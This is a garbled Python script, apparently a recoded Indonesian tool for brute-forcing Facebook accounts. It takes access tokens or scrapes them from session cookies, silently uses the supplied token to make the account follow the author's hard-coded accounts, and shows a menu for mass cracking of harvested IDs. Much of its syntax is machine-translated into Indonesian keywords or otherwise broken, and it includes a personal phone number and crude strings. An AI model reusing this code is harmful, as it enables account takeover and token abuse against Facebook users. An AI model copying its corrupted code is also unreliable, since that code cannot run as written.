#!/usr/bin/python3

#-*-coding:utf-8-*-

# Made With ❤️ By SK HANZ ANONYMOUSE Project

# Update V1.6

_auth01_ = 'Sk hanz'

# Author : Sk hanz 

# Facebook (Es Boba)   : Facebook.com/Es Boba

# Instagram (Sk hanz.29)    : Instagram.com/burhankechil.id

# Whatsapp (Sk hanz Bot_Key)      : +6281943247049

# Recode SC Orang Itu Gak Keren Bro

# Lu Gaakan Bisa Berkembang Kalau Skillu Cuma Recode

# Gaada Yg Susah Selama Lu Mau Belajar & Berusaha

# Jangan Sampai Lu Jual File Source Code Ini !

### Import Module

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess

from random import randint

from concurrent.futures import ThreadPoolExecutor as ThreadPool

from bs4 import BeautifulSoup as par

from datetime import date

from datetime import datetime

from urllib.parse import quote

### Perumpamaan Module & Syntax

_req_ses_  = requests.Session()

_req_get_  = requests.get

_req_post_ = requests.post

_js_lo_    = json.loads

_sk hanz_SK_    = print

_SK_Sk hanz_    = input

_sk  hanz_Sk hanz_ = open

_SK_SK_       = exit

### Warna

Z = "\x1b[0;90m" # Hitam

P = "\x1b[0;97m" # Putih

M = "\x1b[0;91m" # Merah

H = "\x1b[0;92m" # Hijau

K = "\x1b[0;93m" # Kuning

B = "\x1b[0;94m" # Biru

U = "\x1b[0;95m" # Ungu

O = "\x1b[0;96m" # Biru Muda

### Host & Penampungan

host = "https://mbasic.facebook.com"

ok = []

cp = []

ttl = []

count = 1

_putar_ = 0

data_1 = {}

data_2 = {}

data_change_1 = {}

data_change_2 = {}

data_user = []

header_grup = {"user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}

header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}

header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}

url_businness = "https://business.facebook.com"

ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"

web_fb = "https://www.facebook.com/"

### Waktu & Tanggal

__sekarang__ = datetime.now()

__tahun__ = __sekarang__.year

__bulan__ = __sekarang__.month

__hari__  = __sekarang__.day

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

_list_bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]

_qwerty_ = 'https://github.com/Dapunta/elite/blob/main/hahaha.txt'

try:

    if __bulan__ < 0 or __bulan__ > 12:

        _cici_cici_()

    _bulan_sekarang_ = __bulan__ - 1

except ValueError:

    _cici_cici_()

_bulan_ = _list_bulan_[_bulan_sekarang_]

tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))

### Akun Author Jangan Diganti Nanti Error !!!

_my_account_ = [

    '1827084332','100000415317575','100000737201966','100020766075165','100000431996038','100026818103201','100001617352620',

    '100000729074466','607801156','100009340646547','1676993425','1767051257','100000287398094','100001085079906',

    '100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189']

### User Agent

ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'

ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0 .0.48.273;]'

ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

ua_realmi = 'Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Safari/537.36;]'

### Hapus Sesi Masuk

bersih bersih():

    coba:os.remove('token.txt')

    kecuali: lulus

    coba:os.remove('cookies.txt')

    kecuali: lulus

### Teks Tampilan

def jalan(z):

    untuk  e  dalam  z  +  "\n" : sys . stdout . tulis ( e ); sys . stdout . menyiram (); waktu . tidur ( 0,04 )

def mlaku(z):

    untuk e dalam z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

### Hapus Terminal

jelas ():

    jika "linux" di sys.platform.lower():os.system("clear")

    elif "menang" di sys.platform.lower():os.system("cls")

    lain:os.system("hapus")

###Perhatian

      jalan('%s╚══[%s!%s] %sPerhatian Jika Ingin Hasil (%sOK %s) Jangan Lupa Coli Dulu༎ຶ‿༎ຶ'%(M,P,M,P))

      _SK_SK_()

     

### Logo

spanduk def():

    _logo_line_1_ = ('%s _______ __ ___'%(O))

    _logo_line_2_ = ('%s / __/ (_) /____ %s© %s< / '%(O ,P,O))

    _logo_line_3_ = ('%s / _// / / __/ -_) / / %sDikodekan Oleh Sk hanz %s║'%(O,P,O))

    _logo_line_4_ = ('%s/___/_/_/\__/\__/ _/ /_ %s• ANONIMOUSE • %s║'%(O,P,O))

    _logo_line_5_ = ('%sMulti Brute Force %s/____/ '%(P,O))

    _dapunta_cici_(_logo_line_1_)

    _dapunta_cici_(_logo_line_2_)

    _dapunta_cici_(_logo_line_3_+'\n')

    _dapunta_cici_ ( _logo_line_4_ )
    
    ### Cek Cookies

def cek_dev():

    _isi_dev_ = _sk hanz_sk hanz_('cookies.txt','r').read()

    if 'null' in _isi_dev_:jalan('%s╚══[%s!%s] %sCookies Invalid, Login Ulang Dengan Cookies'%(M,P,M,P));bersih();_cici_cici_()

    else:pass

### Bot Follow Jangan Diganti Anjink !

def bot_follow(_tok_dev_):

    try:

        for _list_ in _my_account_:

            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)

            except:pass

        _dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P));time.sleep(2)

    except:pass

    

### Menu Login

def menu_log():

    bersih()

    clear()

    banner()

    var_menu()

    pmu = _SK_sk hanz_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))

    _sk hanz_SK_('%s║'%(O))

    if pmu in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()

    elif pmu in ['1','01','001','a']:

        defaultua()

        token = _SK_sk hanz_('%s╚══[%s•%s] %sToken : '%(O,P,O,P))

        try:

            x = _req_get_("https://graph.facebook.com/me?access_token=" + token)

            y = _js_lo_(x.text)

            n = y['name']

            xd = _sk hanz_sk hanz_("token.txt", "w")

            xd.write(token)

            xd.close()

            xz = _sk hanz_sk hanz_('cookies.txt','w')

            xz.write('null')

            xz.close()

            bot_follow(token)

            menu()

        except requests.exceptions.ConnectionError:

            _sk hanz_SK_('%s║'%(O))

            jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))

            _SK_SK_()

        except (KeyError,IOError):

            _sk hanz_SK_('%s║'%(O))

            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))

            bersih()

            menu_log()

    elif pmu in ['2','02','002','b']:

        defaultua()

        cookie = _SK_sk hanz_('%s╚══[%s•%s] %sCookies : '%(O,P,O,P))

        with requests.Session() as xyz:

            try:

                get_tok = xyz.get(url_businness+'/business_locations',headers = {

                    "user-agent":ua_business,

                    "referer": web_fb,

                    "host": "business.facebook.com",

                    "origin": url_businness,

                    "upgrade-insecure-requests" : "1",

                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",

                    "cache-control": "max-age=0",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",

                    "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})

                token = re.search("(EAAG\w+)", get_tok.text).group(1)

                open('cookies.txt','w').write(cookie)

                open('token.txt','w').write(token)

                menu()

            except requests.exceptions.ConnectionError:_sk hanz_SK_('%s║'%(O));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()

            except (KeyError,IOError,AttributeError):_sk hanz_SK_('%s║'%(O));jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,P,M,P));bersih();menu_log()

    elif pmu in ['3','03','003','c']:

        clear()

        var_tutor()

        pf = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_sk hanz_SK_('%s║'%(O))

        if pf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()

        elif pf in ['1','01','001','a']:os.system('xdg-_sk hanz_ https://youtu.be/iUfEGHXdQQM');_SK_sk hanz_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()

        elif pf in ['2','02','002','b']:os.system('xdg-_sk hanz_ https://youtu.be/iUfEGHXdQQM');_SK_sk hanz_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()

        elif pf in ['3','03','003','c']:os.system('xdg-_sk hanz_ https://youtu.be/9snR31AI_h8');tutor_target();_SK_sk hanz_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()

        elif pf in ['4','04','004','d']:tutor_crack();_SK_sk hanz_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()

        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()

    elif pmu in ['4','04','004','d']:

        clear()

        var_author();_SK_sk hanz_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()

    elif pmu in ['5','05','005','e']:hasil()

    elif pmu in ['6','06','006','f']:cek_hasil()

    elif pmu in ['0','00','000','z']:jalan('%s╠══[%s!%s] %sTerima Kasih Telah Menggunakan SC Ini'%(O,P,O,P));jalan('%s╚══[%s!%s] %sSemoga Harimu Menyenangkan :)\n'%(O,P,O,P));time.sleep(3);bersih();clear();_SK_SK_()

    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()

### Menu Utama

def menu():

    clear()

    banner()

    try:

        _dapunta_ = _dapunta_dapunta_("token.txt","r").read()

        _cici_ = _dapunta_dapunta_("cookies.txt","r").read()

        _salsabila_ = {"cookie" : _cici_}

        if 'null' in _cici_:

            status_cookies = ('%sTidak'%(M))

            W = Z

        else:

            status_cookies = ('%sYa'%(H))

            W = P

    except (KeyError,IOError):

        _dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))

        _dapunta_cici_('%s║'%(M))

        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))

        bersih()

        menu_log()

    try:

        token = _dapunta_dapunta_("token.txt","r").read()

        x = _req_get_("https://graph.facebook.com/me?access_token=" + token)

        y = _js_lo_(x.text)

        n = y['name']

        i = y['id']

    except requests.exceptions.ConnectionError:

        _dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))

        _dapunta_cici_('%s║'%(M))

        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah Coli Dulu Biar Work༎ຶ‿༎ຶ'%(M,P,M,P))

        _cici_cici_()

    except (KeyError,IOError):

        _dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))

        _dapunta_cici_('%s║'%(M))

        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))

        bersih()

        menu_log()

    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"]

    except KeyError:ip = " "

    _update_ = 'V1.6'

    _dapunta_cici_('%s╔══[ %sSelamat Datang %s %s]'%(O,P,n,O))

    _dapunta_cici_('%s║'%(O))

    _dapunta_cici_('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))

    _dapunta_cici_('%s╠══[%s•%s] %sIP : %s'%(O,P,O,P,ip))

    _dapunta_cici_('%s╠══[%s•%s] %sToken/Cookies : %sYa%s/%s'%(O,P,O,P,H,P,status_cookies))

    _dapunta_cici_('%s║'%(O))

    _dapunta_cici_('%s╠══[%s•%s] %sStatus : %sFree'%(O,P,O,P,O))

    _dapunta_cici_('%s╠══[%s•%s] %sVersi : %sOpen Source'%(O,P,O,P,O))

    _dapunta_cici_('%s╠══[%s•%s] %sNama : %sFree User'%(O,P,O,P,O))

    _dapunta_cici_('%s╠══[%s•%s] %sEmail : %sNull'%(O,P,O,P,O))

    _dapunta_cici_('%s╠══[%s•%s] %sKey : %sNull'%(O,P,O,P,O))

    _dapunta_cici_('%s╠══[%s•%s] %sPembelian : %sNull'%(O,P,O,P,O))

    _dapunta_cici_('%s╠══[%s•%s] %sKedaluwarsa : %sNull'%(O,P,O,P,O))

    _dapunta_cici_('%s║'%(O))

    _dapunta_cici_('%s╠══[%s01%s] %sCrack ID Teman/Publik'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s02%s] %sCrack ID Pengikut'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s03%s] %sCrack ID Pencarian Nama'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s04%s] %sCrack ID Daftar Pesan'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s05%s] %sCrack ID Suka Posting'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s06%s] %sCrack ID Komentar Post'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s07%s] %sCrack ID Anggota Grup'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s08%s] %sCrack ID Dari File'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s09%s] %sCrack ID Dari Email'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s10%s] %sAcak ID Retak'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s11%s] %sNama Pengguna Retak'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s12%s] %sCrack ID Dari Hashtag'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s13%s] %sCrack ID Dari Beranda'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s14%s] %sCrack ID Pertemanan Masuk'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s15%s] %sCrack ID Pertemanan Keluar'%(O,P,O,W))

    _dapunta_cici_('%s╠══[%s16%s] %sMengambil Jumlah Teman'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s17%s] %sCek Opsi Hasil Crack'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s18%s] %sCek Hasil Crack'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s19%s] %sAgen Pengguna'%(O,P,O,P))

    _dapunta_cici_('%s╠══[%s00%s] %sLog Out'%(O,P,O,P))

    pm = _cici_dapunta_('%s╠══[%s••%s] %sPilih : '%(O,P,O,P))

    _dapunta_cici_('%s║'%(O))

    if pm in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()

    elif pm di ['1','01','001','a']:publik(token)

    elif pm di ['2','02','002','b']:cek_dev();followers(_salsabila_)

    elif pm di ['3','03','003','c']:cek_dev();dump_name(_salsabila_)

    elif pm in ['4','04','004','d']:cek_dev();dump_pesan(_salsabila_,n,i)

    elif pm di ['5','05','005','e']:cek_dev();main_likers(_salsabila_)

    elif pm di ['6','06','006','f']:cek_dev();main_komen(_salsabila_)

    elif pm di ['7','07','007','g']:cek_dev();dump_grup(_salsabila_,_dapunta_)

    elif pm di ['8','08','008','h']:dump_file()

    elif pm di ['9','09','009','i']:dump_email()

    elif pm di ['10','010','0010','j']:_main_random_()

    elif pm di ['11','011','0011','k']:dump_username()

    elif pm di ['12','012','0012','l']:cek_dev();hashtag(_salsabila_)

    elif pm di ['13','013','0013','m']:cek_dev();beranda(_salsabila_)

    elif pm in ['14','014','0014','n']:cek_dev();permintaan_pertemanan_masuk(_salsabila_)

    elif pm in ['15','015','0015','o']:cek_dev();permintaan_pertemanan_keluar(_salsabila_)

    elif pm di ['16','016','0016','p']:teman_target()

    elif pm in ['17','017','0017','q']:cek_hasil()

    elif pm di ['18','018','0018','r']:hasil()

    elif pm di ['19','019','0019','s']:ugen()

    elif pm in ['0','00','000','z']:jalan('%s╚══[%s!%s] %sSampai Jumpa %s%s%s'%(O, P,O,P,O,n,P));bersih();menu_log()

    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
saya
    _dapunta_cici_ ( _logo_line_5_ )
    
    
